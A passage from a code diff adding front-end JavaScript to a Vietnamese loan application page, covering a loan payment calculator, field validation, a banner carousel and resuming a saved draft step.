+                    const timeout5 = setTimeout(() => {
+                        window.location.href = stepUrl;
+                        const index = activeTimeouts.indexOf(timeout5);
+                        if (index > -1) activeTimeouts.splice(index, 1);
+                    }, 2000);
+                    activeTimeouts.push(timeout5);
+                    return;
+                }
+                
+                // currentStep = 1, tiếp tục bình thường
+                
+            } catch (error) {
+                // Tiếp tục bình thường nếu có lỗi
+            }
+        }
+
+        // Banner Carousel Functions - Moved to shared-components.js
+        // Legacy support for banner-slide and dot classes (step1 specific)
+        let bannerIndex = 0;
+
+        function lazyLoadImages() {
+            const images = document.querySelectorAll('img.lazy');
+            images.forEach(img => {
+                if (img.getAttribute('data-src')) {
+                    img.src = img.getAttribute('data-src');
+                    img.removeAttribute('data-src');
+                    img.classList.remove('lazy');
+                }
+            });
+        }
+
+        // Legacy banner support (step1 uses banner-slide and dot instead of slider-item)
+        function changeSlide(n) {
+            bannerIndex = (bannerIndex + n + 2) % 2;
+            updateBannerLegacy();
+        }
+
+        function goToSlide(n) {
+            bannerIndex = n;
+            updateBannerLegacy();
+        }
+
+        function updateBannerLegacy() {
+            const slides = document.querySelectorAll('.banner-slide, .slider-item');
+            const dots = document.querySelectorAll('.dot, .slick-dots li');
+            slides.forEach((slide, i) => slide.classList.toggle('active', i === bannerIndex));
+            dots.forEach((dot, i) => {
+                if (dot.classList.contains('dot')) {
+                    dot.classList.toggle('active', i === bannerIndex);
+                } else {
+                    dot.classList.toggle('slick-active', i === bannerIndex);
+                }
+            });
+            lazyLoadImages();
+        }
+
+        // Enhanced loan calculator display functions
+        function updateLoanCalculatorDisplay() {
+            const loanAmount = document.getElementById('loanAmount')?.value || 0;
+            const loanTerm = document.getElementById('loanTerm')?.value || 0;
+            const interestRate = document.getElementById('interestRate')?.value || 0;
+            
+            // Update display values
+            const loanAmountDisplay = document.getElementById('loanAmountDisplay');
+            const loanTermDisplay = document.getElementById('loanTermDisplay');
+            const interestRateDisplay = document.getElementById('interestRateDisplay');
+            const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
+            
+            if (loanAmountDisplay) {
+                loanAmountDisplay.textContent = formatCurrency(loanAmount);
+            }
+            if (loanTermDisplay) {
+                loanTermDisplay.textContent = loanTerm + ' tháng';
+            }
+            if (interestRateDisplay) {
+                interestRateDisplay.textContent = interestRate + '%';
+            }
+            if (monthlyPaymentDisplay && loanAmount && loanTerm && interestRate) {
+                const monthlyPayment = calculateMonthlyPayment(loanAmount, loanTerm, interestRate);
+                monthlyPaymentDisplay.textContent = formatCurrency(monthlyPayment);
+            }
+        }
+
+        // Calculate monthly payment
+        function calculateMonthlyPayment(principal, months, annualRate) {
+            const monthlyRate = annualRate / 100 / 12;
+            const monthlyPayment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / 
+                                  (Math.pow(1 + monthlyRate, months) - 1);
+            return Math.round(monthlyPayment);
+        }
+
+        // Format currency
+        function formatCurrency(amount) {
+            return new Intl.NumberFormat('vi-VN', {
+                style: 'currency',
+                currency: 'VND'
+            }).format(amount);
+        }
+
+        // Enhanced form validation with visual feedback
+        function enhanceFormValidation() {
+            const formFields = document.querySelectorAll('.form-field');
+            
+            formFields.forEach(field => {
+                const input = field.querySelector('.form-control');
+                if (input) {
+                    input.addEventListener('blur', function() {
+                        validateField(this);
+                        updateLoanCalculatorDisplay();
+                    });
+                    
+                    input.addEventListener('input', function() {
+                        validateField(this);
+                        updateLoanCalculatorDisplay();
+                    });
+                }
+            });
+        }
+
+        // Validate individual field
+        function validateField(input) {
+            const formField = input.closest('.form-field');
+            const value = input.value.trim();
+            
+            // Remove previous states
+            formField.classList.remove('has-error', 'has-success');
+            
+            if (input.hasAttribute('required') && !value) {
+                formField.classList.add('has-error');
+            } else if (value) {
+                // Special validation for account number
+                if (input.id === 'accountNumber') {
+                    if (value.length < 5 || value.length > 20) {
+                        formField.classList.add('has-error');
+                        return;
+                    }
+                }
+                formField.classList.add('has-success');
+            }
+        }
+
+        window.onload = function() {
+            loadUserData();
+            // If user has registration draft, offer resume prompt
+            try {
+                const draft = loadUserData();
+                if (draft && draft.currentStep && draft.currentStep > 1) {
+                    const resume = confirm(`Bạn có hồ sơ đang dở ở bước ${draft.currentStep}. Bạn có muốn tiếp tục không?`);
+                    if (resume) {
+                        const stepUrl = `step${draft.currentStep}.html`;
+                        window.location.href = stepUrl;
+                        return;
+                    }
+                }
+            } catch (_) {}
+            
+            // Initialize enhanced features
+            enhanceFormValidation();
+            updateLoanCalculatorDisplay();
+            
+            // Set disbursement date to today (ISO yyyy-mm-dd for compatibility)
+            const disbursementDate = document.getElementById('disbursementDate');
+            if (disbursementDate) {
+                const today = new Date();
+                const formattedDate = today.toISOString().split('T')[0];
+                disbursementDate.value = formattedDate;
+            }
+            
+            // Add event listeners for loan amount and term changes
+            const loanAmount = document.getElementById('loanAmount');
+            const loanTerm = document.getElementById('loanTerm');
+            
+            if (loanAmount) {
+                loanAmount.addEventListener('change', updateLoanCalculatorDisplay);
+            }
+            if (loanTerm) {
+                loanTerm.addEventListener('change', updateLoanCalculatorDisplay);
+            }
+            
+            // Initialize banner carousel (legacy support for step1)
+            updateBannerLegacy();
+            let bannerInterval = setInterval(() => {
+                bannerIndex = (bannerIndex + 1) % 2;
+                updateBannerLegacy();
+            }, 5000);
+            activeIntervals.push(bannerInterval);
+            
+            // Cleanup function
+            function cleanup() {
+                // Clear all intervals
+                activeIntervals.forEach(interval => {
+                    if (interval) clearInterval(interval);
+                });
+                activeIntervals = [];
+                
+                // Clear all timeouts
+                activeTimeouts.forEach(timeout => {
+                    if (timeout) clearTimeout(timeout);
+                });
+                activeTimeouts = [];
+                
+                // Clear banner interval
+                if (bannerInterval) {
+                    clearInterval(bannerInterval);
+                    bannerInterval = null;
+                }
+            }
+            
+            // Cleanup on page unload
+            window.addEventListener('beforeunload', cleanup);
+            window.addEventListener('pagehide', cleanup);
+            
+            // Override global functions for step1 legacy compatibility
+            window.changeSlide = changeSlide;
+            window.goToSlide = (n) => {
+                if (bannerInterval) {
+                    clearInterval(bannerInterval);
+                    const index = activeIntervals.indexOf(bannerInterval);
+                    if (index > -1) activeIntervals.splice(index, 1);
+                }
+                goToSlide(n);
+                bannerInterval = setInterval(() => {
+                    bannerIndex = (bannerIndex + 1) % 2;
+                    updateBannerLegacy();
+                }, 5000);
+                activeIntervals.push(bannerInterval);
+            };
+        };
+    </script>
+    </div>
+</body>
+</html>
+
+
+
